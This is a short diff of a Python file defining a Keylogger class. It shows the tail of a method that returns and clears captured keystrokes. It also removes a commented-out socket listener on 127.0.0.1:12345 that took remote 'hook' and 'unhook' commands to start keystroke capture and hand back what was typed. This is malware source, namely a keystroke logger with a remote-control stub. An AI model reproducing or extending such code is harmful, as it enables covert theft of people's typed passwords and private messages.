@@ -30,25 +30,4 @@ class Keylogger:
                 r += key
             self.keystroke_logged.clear()
             return r
-
-
-# k = Keylogger()
-
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.bind(('127.0.0.1', 12345))
-# s.listen()
-# conn, adrr = s.accept()
-# while True:
-#     command = conn.recv(1024).decode('utf-8')
-#     print('Received command:', command)
-#     if command == '':
-#         break
-    
-#     if command == 'hook':
-#         k.hook()
-#         print('Hook started')
-#     else:
-#         r = k.unhook()
-#         print('Hook ended')
-#         print(r)
     
